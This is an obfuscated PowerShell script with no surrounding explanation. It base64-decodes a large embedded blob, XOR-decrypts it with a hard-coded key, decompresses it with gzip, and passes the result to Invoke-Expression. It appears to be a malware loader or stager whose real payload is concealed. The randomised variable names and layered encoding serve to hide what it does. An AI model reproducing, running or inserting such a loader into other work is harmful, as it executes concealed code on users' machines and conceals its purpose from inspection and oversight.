$a8firdbnx7mco19 = [System.Text.Encoding]::ascii
function cat4gn6uiybdjm5e8k0zf3wqo9x  {param($bklm7hc9xgo5ipt )
  $7nycur5ab9glxes = [System.Convert]::FromBase64String($bklm7hc9xgo5ipt)
  $ujp2onikhl6sfdm= $a8firdbnx7mco19.GetBytes("tak3jd8q52py")
    $2y8ujalid4trfgs = $7nycur5ab9glxes
    $9twoldscbg0imvu = $(for ($t0wzon6lrfhcadu = 0; $t0wzon6lrfhcadu -lt $2y8ujalid4trfgs.length; ) {
        for ($wipq2rn1mj9x4le = 0; $wipq2rn1mj9x4le -lt $ujp2onikhl6sfdm.length; $wipq2rn1mj9x4le++) {
            $2y8ujalid4trfgs[$t0wzon6lrfhcadu] -bxor $ujp2onikhl6sfdm[$wipq2rn1mj9x4le]
            $t0wzon6lrfhcadu++
            if ($t0wzon6lrfhcadu -ge $2y8ujalid4trfgs.Length) {
                $wipq2rn1mj9x4le = $ujp2onikhl6sfdm.length
            }
        }
    })
	$9nw3fv85cuyp7t6 = New-Object System.IO.MemoryStream( , $9twoldscbg0imvu )

	    $53ib9l1kaefw26u = New-Object System.IO.MemoryStream
        $rl5nt7e2d6iwsf1 = New-Object System.IO.Compression.GzipStream $9nw3fv85cuyp7t6, ([IO.Compression.CompressionMode]::Decompress)
	    $rl5nt7e2d6iwsf1.CopyTo( $53ib9l1kaefw26u )
        $rl5nt7e2d6iwsf1.Close()
		$9nw3fv85cuyp7t6.Close()
		[byte[]] $5y6t7zqgpuk8hxr = $53ib9l1kaefw26u.ToArray()
 $t78b6gc5r0dikwx=$5y6t7zqgpuk8hxr
    return $t78b6gc5r0dikwx
}
[byte[]]$el2b38suandqrt0=cat4gn6uiybdjm5e8k0zf3wqo9x $dpzn70axuibmtkc
[System.Text.Encoding]::ascii.GetString((cat4gn6uiybdjm5e8k0zf3wqo9x "a+pjM2pkOHExMv0srxPIC3oZZtvNNeWzL6CAsqjqH+J+y7GP5KXYQlxz77/ZSCIqRmn7MOgs+ub8yK/OzVkaw1ZgknGAaNc26w9ibrmFzkLbGOYJUFyN/DKCXXkI2Wr7X0Tp9yyHKy6Oq4gxEkYqh8iWOxvxZvXwo03WKfhgYWkl5jOqj9Q/B9xCTNQZtcvwsxmbQxAunLqtRzGsFMzDBxqgBE49VeybEi9KdAtaCltpVqJe8PhXxbyFOkYeADXRbvSct9YzOl3z5B/hhGR+OVaqfWM6utQ+qavOvbTIKq1ZC0ZDn4IHfeoZb3gKSieBRoJW22D0sV09e2f5buf0O/ok4bqqO0/z8H7RNwC1e4cs6MPj5bsIUC/wP1sJcT3NVzjiiQ6NazbFRExGLRRIacuylXRfZ71uwNs8mJ9ixyaPfpsFa/FSaGv1FYmBPIopd83GXN+69mb4gNcwNJZeikDW4BJpNqlu0feX6F//7xDAi1nDg6TXYKeTTpRDe6V2zy4qZkycM9mbX4TOjxSvlkg1nBr617SXKaODaSl01ogIMemK8BAPK5yO6McZSu5NJWpy+zQR44jNUQ9CSkutrAqYJ3OX1G1ZUFBZtCOiLRtCIqgGM644BE6GmYBW4TT8fmxUFkAgBa2VTgEzprVIuRZL2xJouW9EcpRErxRPxKy9Y95B/QiEU3NCamyBPFzD1mbRFQL4FNn8cjEttCz3wqeTB91hhPvcZTJ7lKq+fhlU2VcyBV/WJ9q09GBUQ6TgaX+gPxb6vMOeRMBfPcRUY9XjJJBlYjB/7VYSPVJruODMBflLzubq/wdZac+CQd1ysTzEeWXasZasoQVzT+sjeok9jDeN2PioKxFv9sPEajMknwNvJTin01k5o6dTzRXQe2+7C6QuMZOfe4LgfYvBd8bpqpcyZln472HrRc9PJXtWHAMcWBRU344+W4FMn3NXT+dt46rLB3LJV0ibl9cGvAX592a23IkACwU0Hrfv85GqXbMis9zyDOSfuQzQ7q2j11qS3lg8xpj5rxseFO6QeN0fBWlo0qeKKLa5VyPhNBghEz7ukmkD7uJAvSJMj915slhkS0uXIukU3twrUuHDeEXFiF7w84nMmeX2f5gv7zdJo0wrhwqn9b/rHWYCYSRt1HfnEEJ0wrvNU5d+BBEqxECGaCGXkvAEZQVa8zRV0NZqt1pOKNBSatNH9zvmzWRCq/s0NGpk"))|iex;